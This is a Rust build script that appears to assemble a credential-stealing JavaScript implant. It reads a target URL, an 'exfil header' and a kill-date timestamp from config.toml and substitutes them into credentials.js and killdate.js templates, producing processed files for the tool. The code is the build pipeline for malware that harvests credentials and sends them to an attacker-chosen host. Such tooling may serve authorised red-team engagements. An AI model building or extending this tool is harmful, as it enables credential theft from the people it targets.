use serde::Deserialize;
use std::{fs, env};
use std::path::Path;

#[macro_export]
macro_rules! info {
    ($content:expr) => {
        println!("cargo::warning=\r[{}] {}", "\x1b[34m>\x1b[0m", $content);
    };
}

#[derive(Deserialize)]
struct Config {
    target_url: String,
    exfil_header: String,
    killdate_timestamp: String,
}

fn main() {
    println!("cargo:rerun-if-changed=config.toml");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=src/js/templates/guardrails.js");
    println!("cargo:rerun-if-changed=src/js/templates/credentials.js");
    //println!("cargo:rerun-if-changed=src/js/cookies.js");
    println!("cargo:rerun-if-changed=src/js/killdate.js");
    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_DEBUG");

    let config_path = Path::new("config.toml");
    let config_str = fs::read_to_string(config_path)
        .expect("Failed to read config.toml");

    let config: Config = toml::from_str(&config_str)
        .expect("Failed to parse config.toml");

    let mut credentials_js = fs::read_to_string("src/js/templates/credentials.js")
        .expect("Could not read src/js/templates/credentials.js");

    info!(format!("Using target url: {}", config.target_url));
    credentials_js = credentials_js.replace("TARGET_URL", &config.target_url);

    info!(format!("Using exfil header: {}", config.exfil_header));
    credentials_js = credentials_js.replace("EXFIL_HEADER", &config.exfil_header);

    if env::var("CARGO_FEATURE_DEBUG").is_ok() {
        credentials_js = credentials_js.replace("const debug = false;", "const debug = true;");
    }

    let dest_path = Path::new("src/js/processed_credentials.js");
    fs::write(&dest_path, credentials_js).unwrap();

    let mut killdate_js = fs::read_to_string("src/js/templates/killdate.js")
        .expect("Could not read src/js/templates/killdate.js");


    info!(format!("Using killdate timestamp: {}", config.killdate_timestamp));
    killdate_js = killdate_js.replace("KILLDATE_TIMESTAMP", &config.killdate_timestamp);

    let dest_path = Path::new("src/js/processed_killdate.js");
    fs::write(&dest_path, killdate_js).unwrap();

}
